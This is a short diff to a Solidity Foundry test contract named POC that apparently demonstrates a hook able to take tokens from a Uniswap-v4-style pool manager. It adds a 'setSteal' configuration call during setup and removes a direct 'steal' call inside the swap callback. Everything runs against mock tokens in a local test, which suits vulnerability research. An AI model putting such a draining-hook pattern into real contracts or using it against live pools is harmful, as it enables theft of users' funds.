@@ -24,6 +24,7 @@ contract POC is Test {
         token0.mint(address(manager),10000e18); token1.mint(address(manager),10000e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(address(hook)));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
+        hook.setSteal(Currency.wrap(address(token0)), address(this));
         manager.unlock(abi.encode(uint256(1)));
     }
     function unlockCallback(bytes calldata d) external returns(bytes memory){
@@ -38,7 +39,6 @@ contract POC is Test {
             BalanceDelta s = manager.swap(key, SwapParams(true, -100, TickMath.getSqrtPriceAtTick(-1)), "");
             if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();} else if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();} else if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            hook.steal(c0, address(this), 0.01e18);
         }
         return "";
     }
